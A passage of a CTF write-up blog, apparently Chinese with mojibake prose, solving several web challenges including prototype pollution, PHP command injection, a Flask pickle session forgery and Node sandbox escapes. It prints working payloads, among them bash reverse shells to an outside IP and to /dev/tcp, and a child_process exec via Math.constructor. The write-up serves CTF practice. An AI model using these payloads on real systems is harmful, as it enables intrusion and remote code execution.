punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'mess'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">message</span><span class="token operator">:</span> <span class="token string">"please use POST to edit a note"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">let</span> id <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>id<span class="token punctuation">;</span>        <span class="token keyword">let</span> author <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>author<span class="token punctuation">;</span>        <span class="token keyword">let</span> enote <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>raw<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>id <span class="token operator">&amp;&amp;</span> author <span class="token operator">&amp;&amp;</span> enote<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            notes<span class="token punctuation">.</span><span class="token function">edit_note</span><span class="token punctuation">(</span>id<span class="token punctuation">,</span> author<span class="token punctuation">,</span> enote<span class="token punctuation">)</span><span class="token punctuation">;</span>            res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'mess'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">message</span><span class="token operator">:</span> <span class="token string">"edit note sucess"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'mess'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">message</span><span class="token operator">:</span> <span class="token string">"edit note failed"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">route</span><span class="token punctuation">(</span><span class="token string">'/status'</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">let</span> commands <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string-property property">"script-1"</span><span class="token operator">:</span> <span class="token string">"uptime"</span><span class="token punctuation">,</span>            <span class="token string-property property">"script-2"</span><span class="token operator">:</span> <span class="token string">"free -m"</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> index <span class="token keyword">in</span> commands<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">exec</span><span class="token punctuation">(</span>commands<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">shell</span><span class="token operator">:</span><span class="token string">'/bin/bash'</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span> stdout<span class="token punctuation">,</span> stderr</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">return</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">stdout: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>stdout<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'OK'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è°ƒç”¨äº†undefsafeæ¨¡å—ï¼Œè¯¥æ¨¡å—åœ¨ç‰ˆæœ¬å°äº2.0.3çš„æ—¶å€™å­˜åœ¨åŸå‹é“¾æ±¡æŸ“æ¼æ´</p><p><img src="https://img-blog.csdnimg.cn/70ea2b9eee5c499f9bc3aa29c3ac94f7.png"></p><p>é—®é¢˜å°±å‡ºåœ¨å¯¹ä¸å­˜åœ¨çš„å±æ€§è¿›è¡Œèµ‹å€¼çš„æ—¶å€™ï¼Œä¼ å…¥<code>__proto__</code>å°±ä¼šå¯¼è‡´åŸå‹é“¾æ±¡æŸ“ï¼Œçœ‹ä»£ç ä¸­<code>undefsafe(this.note_list, id + &#39;.author&#39;, author);</code>å…¶ä¸­idå’Œautheræˆ‘ä»¬éƒ½å¯æ§ï¼Œåœ¨authorå¤„æ”¾å…¥æˆ‘ä»¬æƒ³è¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œidå¤„æ„é€ <code>__proto__</code>å³å¯å®ŒæˆåŸå‹é“¾æ±¡æŸ“ï¼Œå¯¼è‡´ä¿¡æ¯ä¼ å…¥å‘½ä»¤æ‰§è¡Œ</p><pre class="line-numbers language-none"><code class="language-none">id&#x3D;__proto__&amp;author&#x3D;bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F43.249.193.167%2F38901%200%3E%261&amp;raw&#x3D;kkk<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="ç¾ŠåŸæ¯-2020-Easyphp2"><a href="#ç¾ŠåŸæ¯-2020-Easyphp2" class="headerlink" title="[ç¾ŠåŸæ¯ 2020]Easyphp2"></a>[ç¾ŠåŸæ¯ 2020]Easyphp2</h2><p>è¿›å»å…ˆç”¨åŒURLç¼–ç ç»•è¿‡wafè¯»æºç </p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'max_execution_time'</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pass'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'PASS'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'pass'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'PASS'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'&lt;h2>'</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;hacker>'</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;h2>'</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;br>'</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;h1>'</span><span class="token operator">.</span><span class="token string single-quoted-string">'404'</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;h1>'</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;br>'</span><span class="token operator">.</span><span class="token string single-quoted-string">'Sorry, only people from GWHT are allowed to access this website.'</span><span class="token operator">.</span><span class="token string single-quoted-string">'23333'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"count"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$count</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"count"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/;|base64|rot13|base32|base16|&lt;\?php|#/i'</span><span class="token punctuation">,</span> <span class="token variable">$count</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;h2>The Count is: "</span> <span class="token operator">.</span> <span class="token function">exec</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'printf \''</span> <span class="token operator">.</span> <span class="token variable">$count</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'\' | wc -c'</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"&lt;/h2>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¯»robotsï¼Œå‘ç°check.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"GWHT"</span><span class="token punctuation">;</span><span class="token comment">// Cookie password.</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"Here is nothing, isn't it ?"</span><span class="token punctuation">;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Location: /'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ›´æ”¹cookieä¸­çš„passï¼Œå‡ºäº†ä¸ªæ–‡æœ¬æ¡†ï¼Œå†…å®¹ä¼ å…¥countè¢«æ‰§è¡Œï¼Œå†™ä¸ªshellè¿›å»ï¼Œç„¶åèšå‰‘è¿æ¥ï¼Œæ‰¾åˆ°flag.txtå‘ç°æ²¡æœ‰è¯»å–æƒé™ï¼Œçœ‹READMEè§£å‡ºå¯†ç <code>GWHTCTF</code>ï¼Œä½¿ç”¨suå‘½ä»¤åˆ‡æ¢ç”¨æˆ·ï¼Œè¯»å–flag</p><pre class="line-numbers language-none"><code class="language-none">shell&#x3D;system(&quot;printf &#39;GWHTCTF&#39; | su  -c &#39;cat &#x2F;GWHT&#x2F;system&#x2F;of&#x2F;a&#x2F;down&#x2F;flag.txt&#39; GWHT&quot;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="HFCTF-2021-Final-easyflask"><a href="#HFCTF-2021-Final-easyflask" class="headerlink" title="[HFCTF 2021 Final]easyflask"></a>[HFCTF 2021 Final]easyflask</h2><p>è¯»æ–‡ä»¶ï¼Œè¯»æºç ï¼Œè¯»ä¸‹ç¯å¢ƒæ‰¾åˆ°<code>secret_key=glzjin22948575858jfjfjufirijidjitg3uiiuuh</code>ï¼Œçœ‹sessionï¼Œæ˜æ˜¾ä¸€ä¸ªpickleï¼Œä¼ªé€ ä¸Šä¼ å°±è¡Œäº†</p><pre class="line-numbers language-none"><code class="language-none">#!&#x2F;usr&#x2F;bin&#x2F;python3.6import osimport picklefrom base64 import b64decodefrom flask import Flask, request, render_template, sessionapp &#x3D; Flask(__name__)app.config[&quot;SECRET_KEY&quot;] &#x3D; &quot;*******&quot;User &#x3D; type(&#39;User&#39;, (object,), &#123;    &#39;uname&#39;: &#39;test&#39;,    &#39;is_admin&#39;: 0,    &#39;__repr__&#39;: lambda o: o.uname,&#125;)@app.route(&#39;&#x2F;&#39;, methods&#x3D;(&#39;GET&#39;,))def index_handler():    if not session.get(&#39;u&#39;):        u &#x3D; pickle.dumps(User())        session[&#39;u&#39;] &#x3D; u    return &quot;&#x2F;file?file&#x3D;index.js&quot;@app.route(&#39;&#x2F;file&#39;, methods&#x3D;(&#39;GET&#39;,))def file_handler():    path &#x3D; request.args.get(&#39;file&#39;)    path &#x3D; os.path.join(&#39;static&#39;, path)    if not os.path.exists(path) or os.path.isdir(path) \            or &#39;.py&#39; in path or &#39;.sh&#39; in path or &#39;..&#39; in path or &quot;flag&quot; in path:        return &#39;disallowed&#39;    with open(path, &#39;r&#39;) as fp:        content &#x3D; fp.read()    return content@app.route(&#39;&#x2F;admin&#39;, methods&#x3D;(&#39;GET&#39;,))def admin_handler():    try:        u &#x3D; session.get(&#39;u&#39;)        if isinstance(u, dict):            u &#x3D; b64decode(u.get(&#39;b&#39;))        u &#x3D; pickle.loads(u)    except Exception:        return &#39;uhh?&#39;    if u.is_admin &#x3D;&#x3D; 1:        return &#39;welcome, admin&#39;    else:        return &#39;who are you?&#39;if __name__ &#x3D;&#x3D; &#39;__main__&#39;:    app.run(&#39;0.0.0.0&#39;, port&#x3D;80, debug&#x3D;False)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pickle<span class="token keyword">from</span> base64 <span class="token keyword">import</span> b64encode<span class="token keyword">import</span> osUser <span class="token operator">=</span> <span class="token builtin">type</span><span class="token punctuation">(</span><span class="token string">'User'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>    <span class="token string">'uname'</span><span class="token punctuation">:</span> <span class="token string">'test'</span><span class="token punctuation">,</span>    <span class="token string">'is_admin'</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span>    <span class="token string">'__repr__'</span><span class="token punctuation">:</span> <span class="token keyword">lambda</span> o<span class="token punctuation">:</span> o<span class="token punctuation">.</span>uname<span class="token punctuation">,</span>    <span class="token string">'__reduce__'</span><span class="token punctuation">:</span> <span class="token keyword">lambda</span> o<span class="token punctuation">:</span> <span class="token punctuation">(</span>os<span class="token punctuation">.</span>system<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">"bash -c 'bash -i >&amp; /dev/tcp/ip/port 0>&amp;1'"</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>u <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>User<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>b64encode<span class="token punctuation">(</span>u<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="HITCON-2016-Leaking"><a href="#HITCON-2016-Leaking" class="headerlink" title="[HITCON 2016]Leaking"></a>[HITCON 2016]Leaking</h2><p>è¿™æ˜¯ä¸€é“å…³äºnode.jsæ²™ç®±é€ƒé€¸çš„é—®é¢˜<br>å¤§è‡´è¯´ä¸€ä¸‹ é¢˜ç›®çš„æè¿°ï¼Œé¦–å…ˆå®šä¹‰å˜é‡flagï¼Œç„¶åæˆ‘ä»¬å¯ä»¥åœ¨æ²™ç®±é‡Œé¢æ‰§è¡Œä»»æ„çš„å‘½ä»¤ï¼Œé‚£æˆ‘ä»¬å¦‚ä½•é€ƒé€¸å‡ºå»å‘¢ï¼Ÿ</p><blockquote><p>åœ¨è¾ƒæ—©ä¸€ç‚¹çš„ node ç‰ˆæœ¬ä¸­ (8.0 ä¹‹å‰)ï¼Œå½“ Buffer çš„æ„é€ å‡½æ•°ä¼ å…¥æ•°å­—æ—¶, ä¼šå¾—åˆ°ä¸æ•°å­—é•¿åº¦ä¸€è‡´çš„ä¸€ä¸ª Bufferï¼Œå¹¶ä¸”è¿™ä¸ª Buffer æ˜¯æœªæ¸…é›¶çš„ã€‚8.0 ä¹‹åçš„ç‰ˆæœ¬å¯ä»¥é€šè¿‡å¦ä¸€ä¸ªå‡½æ•° Buffer.allocUnsafe(size) æ¥è·å¾—æœªæ¸…ç©ºçš„å†…å­˜ã€‚ </p></blockquote><p>è¯¥é¢˜ç¯å¢ƒæ˜¯8.0å‰ï¼Œæˆ‘ä»¬ç›´æ¥ä½¿ç”¨Bufferè¯»å–å†…å­˜å†…å®¹å³å¯</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> timeurl <span class="token operator">=</span> <span class="token string">'http://39115099-9d08-4235-a5d8-300bf6b9ad57.node4.buuoj.cn:81/?data=Buffer(500)'</span>response <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">while</span> <span class="token string">'flag'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> response<span class="token punctuation">:</span>        req <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>        response <span class="token operator">=</span> req<span class="token punctuation">.</span>text        <span class="token keyword">print</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">'flag&#123;'</span> <span class="token keyword">in</span> response<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span>            <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="NPUCTF2020-éªŒè¯ğŸ"><a href="#NPUCTF2020-éªŒè¯ğŸ" class="headerlink" title="[NPUCTF2020]éªŒè¯ğŸ"></a>[NPUCTF2020]éªŒè¯ğŸ</h2><p>ç»™äº†æºç ï¼Œå°±ä¸æ”¾äº†ï¼Œç›´æ¥çœ‹å…³é”®ï¼Œé¦–å…ˆæ˜¯ä¸€ä¸ªmd5ç»•è¿‡ï¼Œåˆ©ç”¨jså¼±ç±»å‹ç›¸åŠ ã€</p><pre class="line-numbers language-none"><code class="language-none">[1]+&#39;1&#39; &#x2F;&#x2F;&#39;11&#39;&#39;1&#39;+&#39;1&#39; &#x2F;&#x2F;&#39;11&#39;[1]!&#x3D;&#x3D;&#39;1&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">if (first &amp;&amp; second &amp;&amp; first.length &#x3D;&#x3D;&#x3D; second.length &amp;&amp; first!&#x3D;&#x3D;second &amp;&amp; md5(first+keys[0]) &#x3D;&#x3D;&#x3D; md5(second+keys[0]))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç„¶åå°±æ˜¯ä¼ å…¥çš„å†…å®¹</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">saferEval</span><span class="token punctuation">(</span><span class="token parameter">str</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>str<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">(?:Math(?:\.\w+)?)|[()+\-*/&amp;|^%&lt;>=,?:]|(?:\d+\.?\d*(?:e\d+)?)| </span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token function">eval</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™é‡Œæ­£åˆ™ä¼šå‘ç°å¯ç”¨å‡½æ•°åªæœ‰Mathï¼Œæ­¤å¤„ä½¿ç”¨å°–å¤´å‡½æ•°åŠ åŸå‹æ¥æ‰§è¡Œ</p><pre class="line-numbers language-none"><code class="language-none">function (x) &#123;    return x * x;&#125;è¯¥å‡½æ•°ä½¿ç”¨ç®­å¤´å‡½æ•°å¯ä»¥ä½¿ç”¨ä»…ä»…ä¸€è¡Œä»£ç æå®šï¼x &#x3D;&gt; x * x<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ­¤å¤„å–MathåŸå‹å¯å¾—åˆ°Function</p><pre class="line-numbers language-none"><code class="language-none">Math.constructor.constructor<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>åˆå› ä¸ºä¸èƒ½ç›´æ¥ä¼ å…¥å‘½ä»¤æ‰§è¡Œï¼Œä½¿ç”¨Stringä¸­çš„String.fromCharCode()æ¥å°†æ•°å­—è½¬æ¢æˆå­—ç¬¦ä¸²ï¼Œå†åˆ©ç”¨jsä¸­å¼±ç±»å‹ç›¸åŠ æ„é€ å‡ºå­—ç¬¦ä¸²ç±»ï¼Œæ„é€ å‡ºå¦‚ä¸‹payload</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">(</span><span class="token parameter">Math</span><span class="token operator">=></span>        <span class="token punctuation">(</span>Math<span class="token operator">=</span><span class="token class-name">Math</span><span class="token punctuation">.</span>constructor<span class="token punctuation">,</span><span class="token comment">//æ­¤å¤„ç±»å‹ä¸ºÆ’ String() &#123; [native code] &#125;</span>                Math<span class="token punctuation">.</span>x<span class="token operator">=</span><span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">constructor</span><span class="token punctuation">(</span>  <span class="token comment">//æ­¤å¤„ç±»å‹ä¸ºÆ’ Function() &#123; [native code] &#125;ï¼Œç”Ÿæˆä¸€ä¸ªåŒ¿åå‡½æ•°</span>                    Math<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">117</span><span class="token punctuation">,</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">112</span><span class="token punctuation">,</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span>                        <span class="token number">99</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">46</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token number">77</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">117</span><span class="token punctuation">,</span><span class="token number">108</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span>                        <span class="token number">46</span><span class="token punctuation">,</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">113</span><span class="token punctuation">,</span><span class="token number">117</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">40</span><span class="token punctuation">,</span><span class="token number">39</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">104</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">108</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span>                        <span class="token number">95</span><span class="token punctuation">,</span><span class="token number">112</span><span class="token punctuation">,</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">39</span><span class="token punctuation">,</span><span class="token number">41</span><span class="token punctuation">,</span><span class="token number">46</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">120</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">83</span><span class="token punctuation">,</span>                        <span class="token number">121</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">40</span><span class="token punctuation">,</span><span class="token number">39</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">47</span><span class="token punctuation">,</span><span class="token number">102</span><span class="token punctuation">,</span><span class="token number">108</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">103</span><span class="token punctuation">,</span><span class="token number">39</span><span class="token punctuation">,</span><span class="token number">41</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span>Math<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åŒæ—¶ä½¿ç”¨äº†ç®­å¤´å‡½æ•°å’Œè‡ªè°ƒç”¨å‡½æ•°ï¼Œ+1å°†Mathè½¬æ¢ä¸ºStringç±»å‹ä¼ å…¥ï¼Œè€Œåé€šè¿‡Functionæ„é€ å‡ºä¸€ä¸ªå‡½æ•°å¹¶è¿›è¡Œè‡ªè°ƒç”¨æ¥å°†è¿”å›å€¼ä¼ å…¥Math.xï¼Œæœ€ç»ˆçš„è¿”å›å€¼ä¹Ÿå°±æ˜¯Math.xçš„å€¼</p><h2 id="CISCN2021-Quals-upload"><a href="#CISCN2021-Quals-upload" class="headerlink" title="[CISCN2021 Quals]upload"></a>[CISCN2021 Quals]upload</h2><p>ä¿©æ–‡ä»¶ï¼Œä¸€ä¸ªuploadï¼Œä¸€ä¸ªexample</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">//upload<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"ctf"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"ctf"</span><span class="token 